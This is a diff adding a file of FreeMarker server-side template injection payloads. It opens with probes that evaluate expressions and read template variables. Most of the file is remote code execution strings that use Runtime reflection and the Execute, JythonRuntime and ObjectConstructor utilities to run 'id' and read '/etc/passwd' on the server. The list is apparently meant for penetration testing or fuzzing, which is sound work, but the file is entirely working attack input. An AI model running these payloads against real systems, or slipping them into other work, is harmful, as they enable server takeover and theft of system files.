@@ -1,0 +1,18 @@
+${7*7}
+${7*'7'}
+${.vars}
+${.data_model}
+${.version}
+${.current_template_name}
+${.main}
+${.locale}
+${.template_name}
+${.output_encoding}
+${.url_escaping_charset}
+${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime"),"id")}
+${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime"),"cat /etc/passwd")}
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+${"freemarker.template.utility.JythonRuntime"?new()("id")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+${("freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","cat /etc/passwd")).start()}
